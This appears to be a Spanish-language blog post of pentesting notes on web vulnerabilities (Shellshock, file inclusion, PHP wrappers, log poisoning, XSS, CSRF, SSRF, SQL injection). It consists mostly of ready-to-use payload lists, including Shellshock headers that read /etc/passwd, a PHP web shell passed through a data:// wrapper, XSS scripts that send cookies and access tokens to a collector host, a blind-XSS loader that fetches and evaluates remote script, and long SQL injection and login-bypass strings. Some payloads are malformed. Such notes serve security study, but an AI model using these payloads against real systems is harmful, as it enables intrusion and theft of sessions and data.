---
layout: single
title: Vulnerabilidades Web 
excerpt: "Las vulnerabilidades web son un defecto o fallo que ocurre por la programación, diseño configuración, esto puede alterar el flujo del programa que se este ejecutando, siendo esta aprovechada por un atacante para poder ganar acceso o realizar a un servidor"
date: 2022-02-26
classes: wide
header:
  teaser: /assets/images/vulnerabilidadesWeb/logo-web.png
  teaser_home_page: true
  icon: 
categories:
  - vulnerabilidades web
tags:
  - linux
  - notes
---

Conceptos básicos y a grandes rasgos de las vulnerabilidades asi como recursos de como explotarlas cada uno de estas

|---------------------|---------------------|---------------------|
|- [SHELLSHOCK](#shellshock)|- [LOCAL FILE INCLUSION (LFI)](#local-file-inclusion-lfi)|[WRAPPERS](#wrappers)|
|[LOG POISONING](#log-poisoning)|[REMOTE FILE INCLUSION (RFI)](#remote-file-inclusion-rfi)|- [HTML INJECTION](#html-injection)|
|- [CROSS-SITE SCRIPTING (XSS)](#cross-site-scripting-xss)|- [BLIND CROSS-SITE SCRIPTING (BLIND XSS)](#blind-cross-site-scripting-blind-xss)|- [CROSS-SITE REQUEST FORGERY(CSRF)](#cross-site-request-forgerycsrf)|
|- [SERVER-SIDE REQUEST FORGERY (SSRF)](#server-side-request-forgery-ssrf)|- [SQL INJECTION / ERROR BASED](#sql-injection--error-based)|- [SQL INJECTION / TIME BASED (BLIND)](#sql-injection--time-based)|

## SHELLSHOCK
Esto esta presente principalmente en los servidores Web HTTP, es una vulnerabilidad en el shell de bash de los sistemas operativos Linux/Unix. Aquellos servidores que ejecutan FastCGI o CGI son capaces de exponer el bash al vector de petición de HTTP. Así permitiendo que un atacante pueda ejecutar comandos en el servidor y el bash pueda ser ejecutado.

Esto radíca en que se puede ejecutar codigo malicioso en el "User-Agent" como por ejemplo:

```json 
curl -H 'User-Agent: () { :; }; eco ; eco ; /bin/cat /etc/passwd' bash -s :'' http://IP-Victim/cgi-bin/test.cgi
```

```json
{
    "DEFAULT":
        "() { :; }; echo ; /bin/bash -c '_COMMAND_'",
    "CVE-2014-6271": 
        "() { :; }; echo _CHECKER_; /bin/bash -c '_COMMAND_'",
    "CVE-2014-6271-2":
        "() { :;}; echo '_CHECKER_' 'BASH_FUNC_x()=() { :;}; echo _CHECKER_' bash -c 'echo _COMMAND_'",
    "CVE-2014-6271-3":
        "() { :; }; echo ; /bin/bash -c '_COMMAND_';echo _CHECKER_;",
    "CVE-2014-7169":
        "() { (a)=>\\' /bin/bash -c 'echo _CHECKER_'; cat echo",
    "CVE-2014-7186":
        "/bin/bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo '_CHECKER_, redir_stack'",
    "CVE-2014-7187":
        "(for x in {1..200} ; do echo \"for x$x in ; do :\"; done; for x in {1..200} ; do echo done ; done) | /bin/bash || echo '_CHECKER_, word_lineno'",
    "CVE-2014-6278":
        "() { _; } >_[$($())] { echo _CHECKER_; id; } /bin/bash -c '_COMMAND_'",
    "CVE-2014-6278-2":    
        "shellshocker='() { echo _CHECKER_; }' bash -c shellshocker",
    "CVE-2014-6277":
        "() { x() { _; }; x() { _; } <<a; } /bin/bash -c _COMMAND_;echo _CHECKER_",
    "CVE-2014-*":
        "() { }; echo _CHECKER_' /bin/bash -c '_COMMAND_'"
}
```
Esto se podria hacer con curl o desde Burp Suite
```bash
  GET / HTTP/1.1
  Accept-Encoding: gzip,deflate,sdch
  Accept-Language: en-US,en;q=0.8,fr;q=0.6
  Cache-Control: no-cache
  Pragma: no-cache
  User-Agent: [Codigo malicioso] Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
  Host: cloudflare.com
```

Articulos relacionados:
 - [Explotando  ShellShock Manualmente ](https://www.sevenlayers.com/index.php/125-exploiting-shellshock) 
 - [Hacktricks-Pentesting web cgi](https://book.hacktricks.xyz/pentesting/pentesting-web/cgi)
 - [Blog.CloudFlare - inside-ShellShock](https://blog.cloudflare.com/inside-shellshock/)

## LOCAL FILE INCLUSION (LFI)
Vulnerabilidad que permite ejecutar o listar archivos localmente en el servidor de ahí su nombre (local file inclusion) para luego tener acceso a archivos de configuración o credenciales que se pueden enumerar de la siguiente manera:

Teniendo la siguiente web,
- [http://www.example.com/index.php](#local-file-inclusi%C3%B3n-lfi)

esta se puede explotar de de diversas formas una de ellas
- [http://www.example.com/index.php?page=/etc/passwd](#local-file-inclusi%C3%B3n-lfi)

al poder listar los archivos del servidor se podria listar la id_rsa de usuario u obtener acceso al servidor.

Esta vulnerabilidad va de la mano con el de un directory traversal

```json
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
Para poder burlar algun filtro lo podemos hacer las siguientes maneras:
```json
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

- [Payloads de archivos de interes de linux y windows](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#bypass--with-)
- [Técnicas de bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi)

## WRAPPERS

Siendo una web vulnerable a un LFI, esta podria tener algunas mejorar y para poder listar archivos se usa wrappers para realizar un pypass de estos filtros

  - PHP wrapper expect://
  ```json
  http://example.com/index.php?page=expect://whoami
  ``` 
  - PHP wrapper data: //
  ```json
  http://www.ex.com/index.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
  ```
  - PHP Wrapper filter: //
  ```json
  http://ex.com/index.php?page=php://filter/read=string.rot13/resource=index.php
  http://ex.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
  ```
  - PHP Wrapper base64://
  ```json
  http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
  http://example.com/index.php?page=php://FilTer/convert.base64-encode/resource=index.php
  http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
  ```
  - PHP Wrapper ZIP 
  ```json
  http://example.com/index.php?page=zip://shell.jpg%23payload.php
  ```
  Mas Recursos:
    - [RFI-LFI-Payloads list](https://github.com/payloadbox/rfi-lfi-payload-list)
    - [LFI-Cheat-Sheet](https://ironhackers.es/herramientas/lfi-cheat-sheet/)
    - [Payloads-Flie_Iclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers)
    - [Directory-Traversal Cheat Sheet](https://pentestlab.blog/2012/06/29/directory-traversal-cheat-sheet/)

## LOG POISONING
  Esta vulnerabilidad ocurre cuando se puede listar y visualizar los archivos logs, los cuales interpretan el codigo que se le introduce, el explotado es /var/log/apache2/access.log el cual puedes definir el "User-Agent" y insertar codigo malicioso en este para obtener ejecucion de comandos. Veamos el siguiente ejemplo:

  Tenemos una web en la que se puede listar un archivo .log, en este caso es el /var/log/apache2/access.log 
  ```json
    http://www.web.com/index.php?file=/var/log/apache2/access.log
  ```

  Al poder definir el "User-Agent", tambien podemos insertar codigo maliciso y enumerar el servidor. Podemos usar diversas herramientas, pero en el siguiente ejemplo usamos curl.

  ```json
    curl -s -H "User-Agent: <?php system('whoami')?>" "http://www.example.com/index.php?file=/var/log/apache2/access.log"
  ```
  Recursos :  
  - [OSCP-cheatsheet](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Inclusion.md)
  - [Wordlist de archivos logs](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux)
  - [Wordlist de archivos logs](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)

## REMOTE FILE INCLUSION (RFI)
Vulnerabilidad existente en paginas dinámicas en PHP que permite enlazar archivos situados remotamente,  eta vulnerabilidad si el principio del LFI solo que en esta se ejecutan archivos fuera del servidor.

Tenemos la siguiente web, al ser vulnerable al un RFI 
```json
  http://[servidor_victima]/index.php?=index.html"

```

Podemos realizar lo siguiente. 
```json
  http://[servidor_victima]/index.php?page=http://[servidor_atacante]/archivo_malicioso.txt
```
Al listar lo que contiene el "archivo_malicioso.txt" desde el servidor víctima, podriamos ejecutar comando a nivel del sistema, si en nuestro archivo malicioso contiene lo siguiente:

```bash
  <?
    system($cmd);
  ?>
```
Entonces ejecutariamos de la siguiente manera:

```json
  http://[servidor_victima]/index.php?page=http://[servidor_atacante]/archivo_malicioso.txt&&cmd=ls
```
El archivo debe tener una extensión distinta a cualquier otra que se pueda ejecutar en el servidor del atacante (.txt,.gif, etc), una extensión ".php" no sería válida, ya que en el servidor víctima al incluir el fichero con extensión.php se estaría ejecutando antes el código php en el servidor del atacante; recordemos que el código php se ejecuta en el servidor y el usuario solo puede ver el resultado, es por esto que el código del script malicioso debe ir con una extensión distinta, ya que la función include, require, require_once, include_once ejecutaría el código php contenido en el fichero que se pasa como parámetro a la función, sin importar la extensión que tenga.

Lo que la víctima incluye en su página son secciones que se pasan a la variable page según el ejemplo anterior.

```bash
  <?
    include_once($page)
  ?>
```

## HTML INJECTION
Es un tipo de vulnerabilidad caracterizado por la injección de codigo html para modificar la apariencia de la pagina web. Esto mayormente se da en formularios, donde el usuario puede ingresar información. Se podría testear de la siguiente manera:

Tenemos los siguientes campos en el cual podemos ingresar codigo html, y si es vulnerable nos deberia de interpretar:

```html
   <marquee>Testeando...</marquee>
```
Ingresando lo anterior en el input que tenemos.
<form style="border: 1px solid red">
    Input:<br> <input type="text" name="name" style="border: 1px solid blue" placeholder="<marquee>Testeando...</marquee>">
    <p>Tendríamos un resultado de la siguiente manera</p>
    <br> <marquee>Testeando...</marquee>
</form>


## CROSS-SITE SCRIPTING (XSS)
Esta vulnerabilidad permite la injección de código javascript y pdoriamos testearlo ingresando el siguiete codigo:

```javascript
  <script>alert(Testeando un xss)</script>
```

si nos sale una ventana emergente con el mensaje que pongas, entonces la aplicación web sería vulnerable.

Algunos Payloads:

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>

<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>

```

## BLIND CROSS-SITE SCRIPTING (BLIND XSS)
Es una variente del XSS en la cual el atacante despliega una serie de srcipts maliciosos a la aplicación web. 

Las Blind XSS el resultado de Cross Site Scripting no lo ve el usuario atacante, sino el usuario Administrador Servicio web, y con este enviando respuesta al Atacante.. y asi haciendo el ataque de manera ciega.

Payloads:

```html
<script> document.write(<img src="http://your-ip:8080/Sie7e.jpg?cookie=' + document.cookie'" > </script>
<script>document.location='http://your-ip:8080/XSS/grabber.php?c='+document.domain</script>
"><script src=//domain></script>

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>

<script>$.getScript("//yoursubdomain.xss.ht")</script>

<script>document.location='http://your-ip:8080/XSS/grabber.php?c='+document.domain</script>
```
## CROSS-SITE REQUEST FORGERY(CSRF)
Cuando inicia sesión en un sitio determinado, normalmente tiene una sesión.

El identificador de esa sesión se almacena en una cookie en su navegador y se envía con cada solicitud a ese sitio. Incluso si algún otro sitio activa una solicitud, la cookie se envía junto con la solicitud y la solicitud se maneja como si el usuario que inició sesión la hubiera realizado.

```html
html get-Interacción con el usuario:
  <a href =" http://www.example.com/api/setusername?username=CSRFd " > Haga clic </a>

html get-No requiere interacción con el usuario:
  <img  src =" http://www.example.com/api/setusername?username=CSRFd " >

html post- Requiere la iteracción del usuario:
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>

<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>

```

Recursos:
- [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://hackerone.com/reports/100820)
- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton](https://whitton.io/articles/messenger-site-wide-csrf/)
- [CSRF-injecction](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

## SERVER-SIDE REQUEST FORGERY (SSRF)
La falsificación de solicitudes del lado del servidor o SSRF es una vulnerabilidad en la que un atacante obliga a un servidor a realizar solicitudes en su nombre.

- SSRF básico:
  ```python
    http://127.0.0.1:80
    http://127.0.0.1:443
    http://127.0.0.1:22
    http://0.0.0.0:80
    http://0.0.0.0:443
    http://0.0.0.0:22
  ```

- SSRF  alternativo:

  ```python 
    http://localhost:80
    http://localhost:443
    http://localhost:22
  ```
- SSRF redereccionar a otro dominio

  ```python
    http://spoofed.burpcollaborator.net
    http://localtest.me
    http://customer1.app.localhost.my.company.127.0.0.1.nip.io
    http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
    http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
  ```
## SQL INJECTION

- [Authentication-bypass](#authentication-bypass)
- [sql-injection-payloads-clasicos](#sql-injection-payloads-clasicos)
- [Union-select-payloads-clasicos](#union-select-payloads-clasicos)

Ataque que permite al atacante inserta sentencias SQL maliciosas en una aplicación web obteniendo información sensible de la base de datos de la aplicación web

  - Si ingresamos lo siquiente
  ```sql
    '
    %27
    "
    %22
    #
    %23
    ;
    %3B
    )
    Wildcard (*)
    &apos;  # required for XML content
  ```
  veremos algun tipo de error, esto nos indica que la aplicación es vulnerable, entonces procederíamos a enumerar la base de datos y extraer datos sensibles.

### SQL INJECTION / ERROR BASED

  La inyección SQL basada en errores es una técnica de inyección SQL en banda que se basa en los mensajes de error lanzados por el servidor de bases de datos para obtener información sobre la estructura de la base de datos. En algunos casos, la inyección SQL basada en errores es suficiente para que un atacante enumere toda una base de datos. Mientras que los errores son muy útiles durante la fase de desarrollo de una aplicación web, deben ser desactivados en un sitio en vivo, o registrados en un archivo con acceso restringido en su lugar.


  ```sql
    OR 1=1
    OR 1=0
    OR x=x
    OR x=y
    OR 1=1#
    OR 1=0#
    OR x=x#
    OR x=y#
    OR 1=1-- 
    OR 1=0-- 
    OR x=x-- 
    OR x=y-- 
    OR 3409=3409 AND ('pytW' LIKE 'pytW
    OR 3409=3409 AND ('pytW' LIKE 'pytY
    HAVING 1=1
    HAVING 1=0
    HAVING 1=1#
    HAVING 1=0#
    HAVING 1=1-- 
    HAVING 1=0-- 
    AND 1=1
    AND 1=0
    AND 1=1-- 
    AND 1=0-- 
    AND 1=1#
    AND 1=0#
    AND 1=1 AND '%'='
    AND 1=0 AND '%'='
    AND 1083=1083 AND (1427=1427
    AND 7506=9091 AND (5913=5913
    AND 1083=1083 AND ('1427=1427
    AND 7506=9091 AND ('5913=5913
    AND 7300=7300 AND 'pKlZ'='pKlZ
    AND 7300=7300 AND 'pKlZ'='pKlY
    AND 7300=7300 AND ('pKlZ'='pKlZ
    AND 7300=7300 AND ('pKlZ'='pKlY
    AS INJECTX WHERE 1=1 AND 1=1
    AS INJECTX WHERE 1=1 AND 1=0
    AS INJECTX WHERE 1=1 AND 1=1#
    AS INJECTX WHERE 1=1 AND 1=0#
    AS INJECTX WHERE 1=1 AND 1=1--
    AS INJECTX WHERE 1=1 AND 1=0--
    WHERE 1=1 AND 1=1
    WHERE 1=1 AND 1=0
    WHERE 1=1 AND 1=1#
    WHERE 1=1 AND 1=0#
    WHERE 1=1 AND 1=1--
    WHERE 1=1 AND 1=0--
    ORDER BY 1-- 
    ORDER BY 2-- 
    ORDER BY 3-- 
    ORDER BY 4-- 
    ORDER BY 5-- 
    ORDER BY 6-- 
    ORDER BY 7-- 
    ORDER BY 8-- 
    ORDER BY 9-- 
    ORDER BY 10-- 
    ORDER BY 11-- 
    ORDER BY 12-- 
    ORDER BY 13-- 
    ORDER BY 14-- 
    ORDER BY 15-- 
    ORDER BY 16-- 
    ORDER BY 17-- 
    ORDER BY 18-- 
    ORDER BY 19-- 
    ORDER BY 20-- 
    ORDER BY 21-- 
    ORDER BY 22-- 
    ORDER BY 23-- 
    ORDER BY 24-- 
    ORDER BY 25-- 
    ORDER BY 26-- 
    ORDER BY 27-- 
    ORDER BY 28-- 
    ORDER BY 29-- 
    ORDER BY 30-- 
    ORDER BY 31337-- 
    ORDER BY 1# 
    ORDER BY 2# 
    ORDER BY 3# 
    ORDER BY 4# 
    ORDER BY 5# 
    ORDER BY 6# 
    ORDER BY 7# 
    ORDER BY 8# 
    ORDER BY 9# 
    ORDER BY 10# 
    ORDER BY 11# 
    ORDER BY 12# 
    ORDER BY 13# 
    ORDER BY 14# 
    ORDER BY 15# 
    ORDER BY 16# 
    ORDER BY 17# 
    ORDER BY 18# 
    ORDER BY 19# 
    ORDER BY 20# 
    ORDER BY 21# 
    ORDER BY 22# 
    ORDER BY 23# 
    ORDER BY 24# 
    ORDER BY 25# 
    ORDER BY 26# 
    ORDER BY 27# 
    ORDER BY 28# 
    ORDER BY 29# 
    ORDER BY 30#
    ORDER BY 31337#
    ORDER BY 1 
    ORDER BY 2 
    ORDER BY 3 
    ORDER BY 4 
    ORDER BY 5 
    ORDER BY 6 
    ORDER BY 7 
    ORDER BY 8 
    ORDER BY 9 
    ORDER BY 10 
    ORDER BY 11 
    ORDER BY 12 
    ORDER BY 13 
    ORDER BY 14 
    ORDER BY 15 
    ORDER BY 16 
    ORDER BY 17 
    ORDER BY 18 
    ORDER BY 19 
    ORDER BY 20 
    ORDER BY 21 
    ORDER BY 22 
    ORDER BY 23 
    ORDER BY 24 
    ORDER BY 25 
    ORDER BY 26 
    ORDER BY 27 
    ORDER BY 28 
    ORDER BY 29 
    ORDER BY 30 
    ORDER BY 31337 
    RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
    RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
    IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
    IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
    %' AND 8310=8310 AND '%'='
    %' AND 8310=8311 AND '%'='
    and (select substring(@@version,1,1))='X'
    and (select substring(@@version,1,1))='M'
    and (select substring(@@version,2,1))='i'
    and (select substring(@@version,2,1))='y'
    and (select substring(@@version,3,1))='c'
    and (select substring(@@version,3,1))='S'
    and (select substring(@@version,3,1))='X'
  ```

### SQL INJECTION / TIME BASED 

  La inyección SQL basada en el tiempo es una técnica de inyección SQL inferencial que se basa en el envío de una consulta SQL a la base de datos que obliga a la base de datos a esperar un tiempo determinado (en segundos) antes de responder. El tiempo de respuesta indicará al atacante si el resultado de la consulta es TRUE o FALSE.
  
  ```sql
    # from wapiti
    sleep(5)#
    1 or sleep(5)#
    " or sleep(5)#
    ' or sleep(5)#
    " or sleep(5)="
    ' or sleep(5)='
    1) or sleep(5)#
    ") or sleep(5)="
    ') or sleep(5)='
    1)) or sleep(5)#
    ")) or sleep(5)="
    ')) or sleep(5)='
    ;waitfor delay '0:0:5'--
    );waitfor delay '0:0:5'--
    ';waitfor delay '0:0:5'--
    ";waitfor delay '0:0:5'--
    ');waitfor delay '0:0:5'--
    ");waitfor delay '0:0:5'--
    ));waitfor delay '0:0:5'--
    '));waitfor delay '0:0:5'--
    "));waitfor delay '0:0:5'--
    benchmark(10000000,MD5(1))#
    1 or benchmark(10000000,MD5(1))#
    " or benchmark(10000000,MD5(1))#
    ' or benchmark(10000000,MD5(1))#
    1) or benchmark(10000000,MD5(1))#
    ") or benchmark(10000000,MD5(1))#
    ') or benchmark(10000000,MD5(1))#
    1)) or benchmark(10000000,MD5(1))#
    ")) or benchmark(10000000,MD5(1))#
    ')) or benchmark(10000000,MD5(1))#
    pg_sleep(5)--
    1 or pg_sleep(5)--
    " or pg_sleep(5)--
    ' or pg_sleep(5)--
    1) or pg_sleep(5)--
    ") or pg_sleep(5)--
    ') or pg_sleep(5)--
    1)) or pg_sleep(5)--
    ")) or pg_sleep(5)--
    ')) or pg_sleep(5)--
    AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
    AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
    AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
    AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
    AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
    SLEEP(5)#
    SLEEP(5)--
    SLEEP(5)="
    SLEEP(5)='
    or SLEEP(5)
    or SLEEP(5)#
    or SLEEP(5)--
    or SLEEP(5)="
    or SLEEP(5)='
    waitfor delay '00:00:05'
    waitfor delay '00:00:05'--
    waitfor delay '00:00:05'#
    benchmark(50000000,MD5(1))
    benchmark(50000000,MD5(1))--
    benchmark(50000000,MD5(1))#
    or benchmark(50000000,MD5(1))
    or benchmark(50000000,MD5(1))--
    or benchmark(50000000,MD5(1))#
    pg_SLEEP(5)
    pg_SLEEP(5)--
    pg_SLEEP(5)#
    or pg_SLEEP(5)
    or pg_SLEEP(5)--
    or pg_SLEEP(5)#
    '\"
    AnD SLEEP(5)
    AnD SLEEP(5)--
    AnD SLEEP(5)#
    &&SLEEP(5)
    &&SLEEP(5)--
    &&SLEEP(5)#
    ' AnD SLEEP(5) ANd '1
    '&&SLEEP(5)&&'1
    ORDER BY SLEEP(5)
    ORDER BY SLEEP(5)--
    ORDER BY SLEEP(5)#
    (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
    (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
    (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
    +benchmark(3200,SHA1(1))+'
    + SLEEP(10) + '
    RANDOMBLOB(500000000/2)
    AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
    OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
    RANDOMBLOB(1000000000/2)
    AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
    OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
    SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
  ```
  
### Authentication bypass

```sql 
  '-'
  ' '
  '&'
  '^'
  '*'
  ' or 1=1 limit 1 -- -+
  '="or'
  ' or ''-'
  ' or '' '
  ' or ''&'
  ' or ''^'
  ' or ''*'
  '-||0'
  "-||0"
  "-"
  " "
  "&"
  "^"
  "*"
  '--'
  "--"
  '--' / "--"
  " or ""-"
  " or "" "
  " or ""&"
  " or ""^"
  " or ""*"
  or true--
  " or true--
  ' or true--
  ") or true--
  ') or true--
  ' or 'x'='x
  ') or ('x')=('x
  ')) or (('x'))=(('x
  " or "x"="x
  ") or ("x")=("x
  ")) or (("x"))=(("x
  or 2 like 2
  or 1=1
  or 1=1--
  or 1=1#
  or 1=1/*
  admin' --
  admin' -- -
  admin' #
  admin'/*
  admin' or '2' LIKE '1
  admin' or 2 LIKE 2--
  admin' or 2 LIKE 2#
  admin') or 2 LIKE 2#
  admin') or 2 LIKE 2--
  admin') or ('2' LIKE '2
  admin') or ('2' LIKE '2'#
  admin') or ('2' LIKE '2'/*
  admin' or '1'='1
  admin' or '1'='1'--
  admin' or '1'='1'#
  admin' or '1'='1'/*
  admin'or 1=1 or ''='
  admin' or 1=1
  admin' or 1=1--
  admin' or 1=1#
  admin' or 1=1/*
  admin') or ('1'='1
  admin') or ('1'='1'--
  admin') or ('1'='1'#
  admin') or ('1'='1'/*
  admin') or '1'='1
  admin') or '1'='1'--
  admin') or '1'='1'#
  admin') or '1'='1'/*
  1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
  admin" --
  admin';-- azer 
  admin" #
  admin"/*
  admin" or "1"="1
  admin" or "1"="1"--
  admin" or "1"="1"#
  admin" or "1"="1"/*
  admin"or 1=1 or ""="
  admin" or 1=1
  admin" or 1=1--
  admin" or 1=1#
  admin" or 1=1/*
  admin") or ("1"="1
  admin") or ("1"="1"--
  admin") or ("1"="1"#
  admin") or ("1"="1"/*
  admin") or "1"="1
  admin") or "1"="1"--
  admin") or "1"="1"#
  admin") or "1"="1"/*
  1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### SQL Injection Payloads Clasicos

```sql
  '
  ''
  `
  ``
  ,
  "
  ""
  /
  //
  \
  \\
  ;
  ' or "
  -- or # 
  ' OR '1
  ' OR 1 -- -
  " OR "" = "
  " OR 1 = 1 -- -
  ' OR '' = '
  '='
  'LIKE'
  '=0--+
  OR 1=1
  ' OR 'x'='x
  ' AND id IS NULL; --
  '''''''''''''UNION SELECT '2
  %00
  /*…*/ 
  +		addition, concatenate (or space in url)
  ||		(double pipe) concatenate
  %		wildcard attribute indicator

  @variable	local variable
  @@variable	global variable


  # Numeric
  AND 1
  AND 0
  AND true
  AND false
  1-false
  1-true
  1*56
  -2


  1' ORDER BY 1--+
  1' ORDER BY 2--+
  1' ORDER BY 3--+

  1' ORDER BY 1,2--+
  1' ORDER BY 1,2,3--+

  1' GROUP BY 1,2,--+
  1' GROUP BY 1,2,3--+
  ' GROUP BY columnnames having 1=1 --


  -1' UNION SELECT 1,2,3--+
  ' UNION SELECT sum(columnname ) from tablename --


  -1 UNION SELECT 1 INTO @,@
  -1 UNION SELECT 1 INTO @,@,@

  1 AND (SELECT * FROM Users) = 1	

  ' AND MID(VERSION(),1,1) = '5';

  ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --


  Finding the table name


  Time-Based:
  ,(select * from (select(sleep(10)))a)
  %2c(select%20*%20from%20(select(sleep(10)))a)
  ';WAITFOR DELAY '0:0:30'--

  Comments:

  #	    Hash comment
  /*  	C-style comment
  -- -	SQL comment
  ;%00	Nullbyte
  `	    Backtick
```
### Union Select Payloads Clasicos:

```sql
  ORDER BY SLEEP(5)
  ORDER BY 1,SLEEP(5)
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
